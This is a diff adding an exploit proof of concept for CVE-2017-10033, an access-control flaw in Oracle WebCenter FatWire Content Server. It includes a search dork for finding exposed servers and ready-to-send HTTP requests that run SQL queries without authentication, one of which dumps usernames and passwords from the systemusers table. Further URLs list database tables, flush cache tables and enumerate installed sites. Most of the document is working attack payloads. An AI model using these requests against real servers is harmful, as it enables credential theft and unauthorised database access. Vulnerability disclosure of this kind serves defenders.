@@ -1,0 +1,61 @@
+# Exploit Title: Oracle WebCenter FatWire Content Server < 7 - Improper Access Control
+# Dork: inurl:Satellite?pagename
+# Date: 2017-10-17
+# Exploit Author: Sebastian Cornejo Olave
+# Vendor Homepage: http://oracle.com
+# Version: 5.5.2 ,7.5 <=
+# CVE: CVE-2017-10033
+# Category: Webapps
+# Tested on: Kali linux
+
+# VULNERABILITY DESCRIPTION
+# It has been discovered that there is an incorrect access control over
+# several resources in previous versions of Fatwire (confirmed
+# FutureTenseContentServer 5.5.2 ,7.5) that allow the sending of SQL
+# queries and query the tables and database schema without authentication.
+
+# PoC : Improper Access Control
+
+PAYLOAD : SQL query
+
+POST /cs/Satellite HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101
+Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+
+tbl=AArticles&query=select+username%2Cpassword+from+systemusers&pagename=Support%2FVerify%2Fexport
+
+
+PAYLOAD : show all table database
+https://www.example.com/cs/Satellite?pagename=Support/Verify/tablelistHTML
+https://www.example.com/cs/Satellite?pagename=Support/CacheManager/FlushTables&cmd=null
+
+OR request
+
+POST /cs/Satellite HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101
+Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+
+pagename=Support/Verify/tablelistHTML
+
+
+PAYLOAD : URL list ID installed Site
+
+https://www.example.com/cs/Satellite?pagename=OpenMarket/Demos/index
+
+# Collaborators
+# Vis0r
+# Queseguridad
